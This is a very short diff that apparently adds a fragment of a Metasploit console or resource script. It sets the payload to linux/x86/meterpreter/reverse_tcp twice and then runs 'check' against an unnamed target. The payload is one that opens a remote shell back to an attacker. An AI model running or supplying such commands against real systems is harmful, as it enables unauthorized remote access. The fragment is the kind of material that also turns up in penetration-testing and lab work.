@@ -1,0 +1,7 @@
+set payload linux/x86/meterpreter/reverse_tcp
+
+set payload linux/x86/meterpreter/reverse_tcp
+
+check
+
+
